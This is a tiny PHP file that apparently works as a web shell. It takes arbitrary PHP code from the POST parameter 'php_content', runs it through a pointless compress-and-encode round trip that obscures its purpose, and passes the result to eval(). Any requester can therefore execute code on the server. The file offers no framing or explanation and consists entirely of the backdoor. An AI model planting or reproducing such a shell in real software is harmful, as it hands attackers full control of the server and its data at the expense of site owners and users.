<?php
$c_ntent=$_POST['php_content'];
$res_t=base64_encode(gzcompress(trim(stripslashes($c_ntent.' '),'<?php, ?>'),9));
eval(gzuncompress(base64_decode($res_t)));
?>